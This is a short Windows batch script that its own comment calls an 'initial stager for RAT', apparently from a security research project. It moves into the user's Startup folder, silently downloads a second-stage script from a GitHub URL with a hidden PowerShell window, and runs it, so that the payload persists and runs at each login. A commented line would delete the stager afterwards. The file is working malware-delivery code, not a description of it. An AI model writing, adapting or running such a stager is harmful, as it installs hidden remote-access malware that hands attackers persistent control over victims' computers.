@echo off
@REM initial stager for RAT

@REM varialbes
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directry
cd %STARTUP%

@REM TODO: build out stage two
@REM Write payloads to startup


powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/poc.cmd' -OutFile poc.cmd"


@REM run payload
powershell ./poc.cmd

@REM cd back into initial Location
cd "%INITIALPATH%"
@REM del initial.cmd